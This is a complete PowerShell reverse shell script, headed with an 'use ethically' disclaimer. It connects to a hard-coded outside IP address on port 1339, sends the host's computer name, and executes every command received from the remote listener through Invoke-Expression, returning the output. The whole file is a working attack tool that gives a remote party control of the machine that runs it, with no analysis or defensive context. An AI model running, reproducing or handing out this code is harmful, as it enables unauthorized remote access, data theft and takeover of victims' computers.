# Reverse Shell Script (Use Ethically and Responsibly)
$IPAddress = "207.180.253.60" # Replace with your listener's IP address
$Port = 1339 # Port to connect to

try {
    $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    # Send acknowledgment to the listener
    $writer.WriteLine("Connection established from $env:COMPUTERNAME")
    $writer.Flush()

    while (($command = $reader.ReadLine()) -ne "exit") {
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($output)
        } catch {
            $writer.WriteLine("Error: $_")
        }
        $writer.Flush()
    }
    
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
} catch {
    Write-Error "Connection failed: $_"
}
